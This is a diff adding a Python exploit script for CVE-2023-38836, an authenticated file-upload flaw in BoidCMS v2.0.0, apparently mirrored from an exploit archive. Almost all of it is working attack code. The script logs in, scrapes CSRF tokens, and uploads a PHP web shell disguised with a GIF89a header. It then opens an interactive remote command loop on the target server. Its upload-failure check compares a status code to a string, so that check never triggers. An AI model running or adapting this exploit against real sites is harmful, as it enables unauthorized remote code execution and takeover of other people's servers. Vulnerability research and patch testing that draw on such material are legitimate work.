@@ -1,0 +1,71 @@
+id: 39109
+date: 10/09/2023
+title: BoidCMS v2.0.0 - authenticated file upload Exploit
+author: 1337kid
+cves: CVE-2023-38836
+
+#!/usr/bin/python3
+# Exploit Title: BoidCMS v2.0.0 - authenticated file upload vulnerability
+# Exploit Author: 1337kid
+# Vendor Homepage: https://boidcms.github.io/#/
+# Software Link: https://boidcms.github.io/BoidCMS.zip
+# Version: <= 2.0.0
+# Tested on: Ubuntu
+# CVE : CVE-2023-38836
+
+import requests
+import re
+import argparse
+
+parser = argparse.ArgumentParser(description='Exploit for CVE-2023-38836')
+parser.add_argument("-u", "--url", help="website url")
+parser.add_argument("-l", "--user", help="admin username")
+parser.add_argument("-p", "--passwd", help="admin password")
+args = parser.parse_args()
+base_url=args.url
+user=args.user
+passwd=args.passwd
+
+def showhelp():
+	print(parser.print_help())
+	exit()
+if base_url == None: showhelp()
+elif user == None: showhelp()
+elif passwd == None: showhelp()
+
+with requests.Session() as s:
+	req=s.get(f'{base_url}/admin')
+	token=re.findall('[a-z0-9]{64}',req.text)
+	form_login_data={
+		"username":user,
+		"password":passwd,
+		"login":"Login",
+	}
+	form_login_data['token']=token
+	s.post(f'{base_url}/admin',data=form_login_data)
+	#=========== File upload to RCE
+	req=s.get(f'{base_url}/admin?page=media')
+	token=re.findall('[a-z0-9]{64}',req.text)
+	form_upld_data={
+		"token":token,
+		"upload":"Upload"
+	}
+	#==== php shell
+	php_code=['GIF89a;\n','<?php system($_GET["cmd"]) ?>']
+	with open('shell.php','w') as f:
+		f.writelines(php_code)
+	#====
+	file = {'file' : open('shell.php','rb')}
+	s.post(f'{base_url}/admin?page=media',files=file,data=form_upld_data)
+	req=s.get(f'{base_url}/media/shell.php')
+	if req.status_code == '404':
+		print("Upload failed")
+		exit()
+	print(f'Shell uploaded to "{base_url}/media/shell.php"')
+	while 1:
+		cmd=input("cmd >> ")
+		if cmd=='exit': exit()
+		req=s.get(f'{base_url}/media/shell.php',params = {"cmd": cmd})
+		print(req.text)
+
+#  0day.today [2023-10-12]  #
